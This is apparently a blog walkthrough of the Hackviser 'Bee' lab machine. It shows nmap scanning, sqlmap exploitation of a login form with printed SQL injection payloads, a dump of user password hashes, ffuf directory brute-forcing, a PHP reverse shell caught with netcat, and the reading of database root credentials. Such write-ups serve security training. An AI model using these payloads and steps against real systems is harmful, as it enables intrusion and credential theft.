---
title: "Bee"
date: 2025-08-24 01:09:33 +0300
comments: true
description: A beginner-friendly Boot2Root machine from Hackviser.
image: /images/Hackviser/Bee.webp
categories: [NMAP, burpsuite, easy, SQLMAP, web, SQLi, boot2root, B2R]
tags:  [NMAP, burpsuite, easy, SQLMAP, web, SQLi, boot2root, B2R]
featureimage: "https://miro.medium.com/v2/resize:fit:1024/1*jPcYVi9NV76-TkwgWXBp3Q.png"
---

## Challenge Description
This warmup machine focuses on teaching how to exploit the SQL Injection vulnerability, which causes database exploits, and the File Upload vulnerability, which causes malicious files to be uploaded to the server.

It is recommended for practicing how to discover and exploit SQL Injection and File Upload vulnerabilities.

## Enumeration
Scanning for open ports using NMAP:

```plaintext
nmap -T4 -sV 172.20.29.74 --open
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-25 19:05 EDT
Nmap scan report for dashboard.innovifyai.hackviser (172.20.29.74)
Host is up (0.035s latency).
Not shown: 515 filtered tcp ports (no-response), 483 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
3306/tcp open  mysql   MySQL (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.43 seconds
```
Notice that we have 2 ports open on the target:
- 80/tcp Running HTTP service
- 3306/tcp Running MySQL service

## Assessing the web application
Visiting the web service running on port 80, we can clearly see that its a static website. We also can note that there is a button to a login page, however, we cant access the page. We need to add the entry to
 our `/etc/hosts` file:

```bash
echo "172.20.29.74 dashboard.innovifyai.hackviser" | sudo tee -a /etc/hosts
```
That then leads us to the login page. However, we don't have any credentials to work with here. I decided, to test the website for vulnerabilities like SQLi using SQLMap. I first intercepted a login request to the website using burpsuite and save the request to a file. It looked like this:
	
```plaintext
	cat login.req 
POST /login_process.php HTTP/1.1
Host: dashboard.innovifyai.hackviser
Content-Length: 51
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://dashboard.innovifyai.hackviser
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dashboard.innovifyai.hackviser/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=fprtmbvnohkn8g0ushe30m9cq7
Connection: keep-alive

email=info%40innovifyai.hackviser&password=password
```
Notice that I used dummy credentials. I then used this request with SQLMap and discovered that the
website is vulnerable to SQL injection. Specifically through the email field. This is the command I used:

```plaintext
sqlmap -r login.req --dbs
```
The output was long, but was summarized in this log:

```plaintext
cat log
sqlmap identified the following injection point(s) with a total of 316 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=info@innovifyai.hackviser' AND 2625=(SELECT (CASE WHEN (2625=2625) THEN 2625 ELSE (SELECT 5063 UNION SELECT 7394) END))-- -&password=password

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: email=info@innovifyai.hackviser' AND GTID_SUBSET(CONCAT(0x7171707871,(SELECT (ELT(4159=4159,1))),0x716a766a71),4159) AND 'iHvX'='iHvX&password=password

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: email=info@innovifyai.hackviser';SELECT SLEEP(5)#&password=password

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=info@innovifyai.hackviser' AND (SELECT 8247 FROM (SELECT(SLEEP(5)))jLIE) AND 'ZBLV'='ZBLV&password=password
---
```
## Assessing the Underlying SQL database
Now that we know that the target webpage is vulnerable to SQLi, let's try and and enumerate the database further.
We'll start by obtaining info about the database by running:

```bash
sqlmap -r login.req --dbs
```
That then gives us some important info:

```plaintext
---
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.6
available databases [5]:
[*] information_schema
[*] innovifyai
[*] mysql
[*] performance_schema
[*] sys

sqlmap resumed the following injection point(s) from stored session:
---
```
One of the important databases we need to assess is the `innovifyai` database. Let's do that:

```bash
sqlmap -r login.req -D innovifyai --tables
```
More info is availed to us about the tables available in that database:
```plaintext
---
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.6
Database: innovifyai
[4 tables]
+-----------+
| customers |
| employees |
| orders    |
| users     |
+-----------+
sqlmap resumed the following injection point(s) from stored session:
---
```
Let's go ahead and further assess the users table:

```bash
sqlmap -r login.req -D innovifyai -T users --dump
====================SNIP========================
Database: innovifyai
Table: users
[2 entries]
+----+---------------------+--------------+---------+----------------------------------+---------------+
| id | email               | name         | isAdmin | password                         | profile_image |
+----+---------------------+--------------+---------+----------------------------------+---------------+
| 1  | sparrow@sparrow.com | Jack Sparrow | 1       | e50c41905bb09fd6fe7fd2bdae06c5b6 | <blank>       |
| 2  | ragetti@ragetti.com | Ragetti      | 1       | e266762ee74709dcdac67e593387cad1 | <blank>       |
+----+---------------------+--------------+---------+----------------------------------+---------------+

```
I then went ahead and cracked the first hash using crackstation.net and managed to login into the website with the credentials `sparrow@sparrow.com:sp4rr0w`.

Notice that this user is an admin user. When I visited the settings page, I saw a place where a user can set their image via an upload functionality. However, I wondered where the image would go after that and
decided to bruteforce the website for hidded pages using FFUF:

```bash
ffuf -ac -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://dashboard.innovifyai.hackviser/FUZZ -recursion -recursion-depth 4 -e .php, .html, .txt
```
I discovered an `/upload` directory that we could easily access. This means, we could possibly try and upload
a PHP reverse shell script to the target and try and execute it while listening in for a connection 
on our attack machine. 

The upload worked, you can confirm that by visiting http://dashboard.innovifyai.hackviser/uploads/. 
## Obtaining a Shell
Let's set a listener for an incoming connection from the target before executing the script:

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.46.15] from (UNKNOWN) [172.20.29.74] 57298
Linux bee 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64 GNU/Linux
 19:52:20 up  1:55,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/
```
As shown above, we manage to get a shell as `www-data` user. When we look around we can find even more interesting file like this one with root credentials to the database:

```bash
$ cat /var/www/dashboard.innovifyai.hackviser/db_connect.php
<?php
$servername = "localhost"; 
$username = "root"; 
$password = "Root.123!hackviser"; 
$database = "innovifyai"; 

try {
    $conn = new PDO("mysql:host=$servername;dbname=$database", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}

?>$ 
```

---

